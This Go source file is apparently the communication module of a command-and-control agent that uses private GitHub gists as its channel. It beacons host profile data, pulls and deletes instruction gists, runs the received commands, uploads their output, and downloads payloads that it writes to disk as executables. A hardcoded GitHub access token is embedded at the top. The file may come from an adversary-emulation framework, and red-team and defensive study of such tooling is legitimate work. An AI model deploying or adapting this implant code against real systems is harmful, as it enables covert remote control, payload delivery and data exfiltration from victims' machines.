package contact

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
	"os"
	"path/filepath"
	"strings"

	"../execute"
	"../output"
	"../util"
)

var (
	token = "89603dc9e5dce1fd8ea9dc737622bfe39dfcc851"
	c2Client *github.Client
	username string
)

//GIST communicate over github gists
type GIST struct {}

func init() {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client = github.NewClient(tc)
}

//Ping tests connectivity to the server
func (contact GIST) Ping(server string) bool {
	ctx := context.Background()
	user, _, err := c2Client.Users.Get(ctx, "")
	if err == nil {
		username = *user.Login
		output.VerbosePrint("[+] Ping success")
		return true
	}
	output.VerbosePrint("[-] Ping failure")
	return false
}

//GetInstructions sends a beacon and returns instructions
func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	ctx := context.Background()
	bites, heartbeat := gistBeacon(ctx, profile)
	var out map[string]interface{}
	if heartbeat == true {
		output.VerbosePrint("[+] Beacon: ALIVE")
		if bites != nil {
			var commands interface{}
			json.Unmarshal(bites, &out)
			json.Unmarshal([]byte(out["instructions"].(string)), &commands)
			out["sleep"] = int(out["sleep"].(float64))
			out["instructions"] = commands
		}
	} else {
		output.VerbosePrint("[-] Beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func (contact GIST) DropPayloads(payload string, server string, uniqueId string) []string {
	ctx := context.Background()
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	if len(payloads) > 0 {
		return gistPayloadDrop(ctx, payloads, uniqueId)
	}
	return []string{}
}

//RunInstruction runs a single instruction
func (contact GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
	ctx := context.Background()
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string))
	gistResults(ctx, profile["paw"].(string), command["id"], result, status, cmd, pid)
}

func gistBeacon(ctx context.Context, profile map[string]interface{}) ([]byte, bool) {
	//collect instructions & delete
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	heartbeat := false
	if err == nil {
		heartbeat = true
		var tasks string
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == fmt.Sprintf("instructions-%s", profile["paw"])) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						tasks = *file.Content
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
		//create heartbeat gist
		data, _ := json.Marshal(profile)
		if createGist(ctx, "beacon", profile["paw"].(string), data).StatusCode != created {
			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		} else {
			output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
		}
		if tasks != "" {
			return util.Decode(tasks), heartbeat
		}
	}
	return nil, heartbeat
}

func gistResults(ctx context.Context, uniqueId string, commandID interface{}, result []byte, status string, cmd string, pid string) {
	link := fmt.Sprintf("%s", commandID.(string))
	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
	if createGist(ctx, "results", uniqueId, data).StatusCode != created {
		output.VerbosePrint(fmt.Sprintf("[-] Results %s GIST: FAILED", link))
	} else {
		output.VerbosePrint(fmt.Sprintf("[+] Results %s GIST: SUCCESS", link))
	}
	if cmd == "die" {
		output.VerbosePrint("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
}

func gistPayloadDrop(ctx context.Context, payloads []string, uniqueId string) []string {
	var droppedPayloads []string
	for _, payload := range payloads {
		location := filepath.Join(payload)
		if len(payload) > 0 && util.Exists(location) == false {
			output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
			gists, _, err := c2Client.Gists.List(ctx, username, nil)
			if err == nil {
				var payload string
				for _, gist := range gists {
					if !*gist.Public && (*gist.Description == fmt.Sprintf("payloads-%s", uniqueId)) {
						fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
						if err == nil {
							for _, file := range fullGist.Files {
								payload = *file.Content
								dst, _ := os.Create(location)
								defer dst.Close()
								_, _ = dst.Write(util.Decode(payload))
								os.Chmod(location, 0500)
							}
						}
						c2Client.Gists.Delete(ctx, fullGist.GetID())
					}
				}
			}
		}
		droppedPayloads = append(droppedPayloads, payload)
	}
	return droppedPayloads
}

func createGist(ctx context.Context, gistType string, uniqueId string, data []byte) *github.Response {
	gistDescriptor := fmt.Sprintf("%s-%s", gistType, uniqueId)
	stringified := string(util.Encode(data))
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistDescriptor)] = file
	public := false
	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
	_, resp, _ := c2Client.Gists.Create(ctx, &gist)
	return resp
}

func getGist() {

}